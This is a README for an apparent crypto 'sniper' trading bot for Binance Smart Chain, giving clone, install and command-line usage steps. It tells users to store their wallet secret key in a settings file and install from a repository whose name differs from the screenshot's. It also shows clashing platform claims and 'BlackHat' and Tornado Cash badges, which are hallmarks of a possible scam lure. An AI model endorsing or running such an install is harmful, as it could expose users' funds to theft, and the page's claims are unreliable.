[![Version](https://img.shields.io/badge/Codename-BlackHat-blue.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-MAC-red.svg)]()
[![Available](https://img.shields.io/badge/Available-MAC-yellow.svg?maxAge=259200)]() 
[![Documentation](https://img.shields.io/badge/TORNADO-CASH-red.svg?maxAge=259200)]() 
[![Contributions Welcome](https://img.shields.io/badge/Type-FREE-green.svg?style=flat)]()

<h2 align="center">⭐️BSC Sniper Savanna 2 Bot FullVersion(WINDOWS LINUX MAC)⭐️</h2>
 
<h4 align="center">⭐️ DO YOU TIRED OF BEAR MARKET ? USE BOTS FOR 24H TRADES ⭐️</h4>

<h4 align="center">⭐️ AUTO BUY TOKEN ON LAUNCH AFTER ADD LIQUIDITY ⭐️</h4>

![Sniper](https://github.com/seeememagaiin/BSC-Sniper-Savanna-2-Bot-FullVersion/blob/main/Screenshot.png)  

 
#### Web3 Sniper GUI Take Profit/StopLose bot written in python3, For ANDROID WIN MAC & LINUX
#### Sniper bot that watches when taxes/anti buy are removed from a contract, then quick snipes, with honeypot detector, and also keybinding for fair launches


BOT is free-to-use,


## The second Binance Smart Chain sniper bot with Honeypot checker!  


# Infos
This Tool only buys/sells with/to BNB but use Multi Hops to get the best Output!
Attention, You pay **[0.1% Tax]** on your swap amount!


# Install
**First of all, you need install Python3+**
Run on Android you need Install [Termux](https://termux.com/)  
```shell
termux: $ pkg install python git
Debian/Ubuntu: $ sudo apt install python3 git make gcc
Windows: Need to install Visual Studio BuildTools & Python3
```

### Setup your Address and secret key in Settings.json.

Clone Repo:  
```shell
git clone https://github.com/JDCORPCOMPANY/BSC_Sniper_Savanna_Sniper-2_Bot_FullVersion/
cd BSC_Sniper_Savanna_Sniper-2_Bot_FullVersion
```

Install Requirements:  
```python
python(3) -m pip install -r requirements.txt
```  

Start Sniper:  
```python
python(3) Sniper.py -t <TOKEN_ADDRESS> -a <AMOUNT> -tx <TXAMOUNT> -hp -wb <BLOCKS WAIT BEFORE BUY> -tp <TAKE PROFIT IN PERCENT> -sl <STOP LOSE IN PERCENT>
python(3) Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -a 0.001 -tx 2 -hp  -wb 10 -tp 50
python(3) Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 --sellonly
python(3) Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -a 0.001 --buyonly
python(3) Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -tsl 10 -nb
```  

Here are all options with infos:  
```python3
*'-t' or '--token', Token for snipe e.g. "-t 0x34faa80fec0233e045ed4737cc152a71e490e2e3"
'-a' or '--amount', float, Amount in Bnb to snipe e.g. "-a 0.1"

'-tx' or '--txamount', how mutch tx you want to send? It split your BNB amount in e.g. "-tx 5"

'-wb' or '--awaitBlocks', default=0, Await Blocks before sending BUY Transaction. e.g. "-ab 50" 

'-hp' or '--honeypot', if you use this Flag, your token get checks if token is honypot before buy!

'-nb' or '--nobuy', No Buy, Skipp buy, if you want to use only TakeProfit/StopLoss/TrailingStopLoss
'-tp' or '--takeprofit', Percentage TakeProfit from your input BNB amount. e.g. "-tp 50" 
'-tsl'or '--trailingstoploss', 'Percentage Trailing-Stop-loss from your first Quote "-tsl 50"

'-so' or '--sellonly', Sell ALL your Tokens from given token address
'-bo' or '--buyonly', Buy Tokens with your given amount

* = require every time its runs!
```
## Trailing-Stop-Loss:
<img src="https://i.ytimg.com/vi/dZFb0-fwqOk/maxresdefault.jpg" height="400">
